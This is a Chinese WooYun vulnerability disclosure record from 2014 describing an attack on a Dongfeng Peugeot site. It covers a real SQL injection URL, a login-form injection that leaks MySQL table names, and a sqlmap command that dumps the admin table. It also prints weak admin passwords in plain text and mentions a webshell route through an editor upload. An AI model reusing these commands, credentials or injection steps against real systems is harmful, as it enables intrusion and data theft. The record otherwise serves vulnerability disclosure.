{"id": 52782, "wybug_id": "wooyun-2014-070189", "wybug_title": "东风标致某业务后台盲注及弱口令导致后台沦陷可getshell", "wybug_corp": "东风标志", "wybug_author": "Ev1l", "wybug_date": "2014-07-30 16:45", "wybug_open_date": "2014-09-13 16:46", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-30：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-09-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 看到有一个标志的sql前台注入了，我就继续研究了一下我来发个后台，来看看吧，希望不要忽略，我的全胜纪录怎么能到此为止…… 详细说明：  #01 注入还是原洞主的注入点可以用\nhttp://408.peugeot.com.cn/show.php?cid=57\n注入点可以直接用，但如果提交这个不就重复了吗？我们要的是别的思路#02盲注我们登录后台（怎么找到的？当然是猜的）看到一个比较格录的……（今天看pkav的教程时候想到了后台注入）\n\n然后试一下  admin'  admin  结果就报错了……很遗憾没有物理路径，要不然配合原洞主的注入就可以sqlmap写shell了。\n\n后台注入到此为止吧……我也不太擅长手工，但是从这里我们发现了一些信息\nDatabase error: Invalid SQL: SELECT id FROM `p_admin` WHERE username = 'admin'' AND password = 'admin' AND stat = 1 MySQL Error: 1064 (You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin' AND stat = 1' at line 1)Session halted.\n数据库类型mysql密码表名  p_admin用户名字段：username密码字段：password物理路径还是无法获得。#03  脱裤sqlmap不解释……估计前洞主没有列数据库，要不然会发现整个主站都是在同一个mysql里一共32个库，可以脱裤\navailable databases [32]:[*] 2014happy[*] 24hours[*] 3015db[*] 308[*] 308powertogo[*] 50db[*] biaozhidashisai[*] happy3008[*] hei3008[*] hobby[*] information_schema[*] lemans[*] mysql[*] performance_schema[*] peugeot301[*] peugeot408[*] peugeot_2008_m[*] peugeot_3008[*] peugeot_3008_1year[*] peugeot_3008_1year_m[*] peugeot_3008_3D[*] peugeot_3008_happy[*] peugeot_408_jy[*] peugeot_408im[*] peugeot_club_35group_2[*] peugeot_cn[*] puzzlegame[*] rcz[*] sport[*] team[*] test[*] zhengyan\n我们根据经验判断是peugeot408这个表，然后表段和字段我们在第二部里都知道了，就直接构造语句\n# Sqlmap -u http://408.peugeot.com.cn/show.php?cid=57 -D peogeot408 -T p_admin -C username,password --dump\n我们发现竟然是弱口令……admin 408408test test继续成功登陆后台\n\n#04 猜想后台存在kindeditor编辑器，可直接上传，审查元素获得webshell   漏洞证明：  后台管理加了一个wooyun  wooyun   修复方案：  多检测一下吧，漏洞挺多的 没猜错还有xss   版权声明：转载请注明来源 Ev1l@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}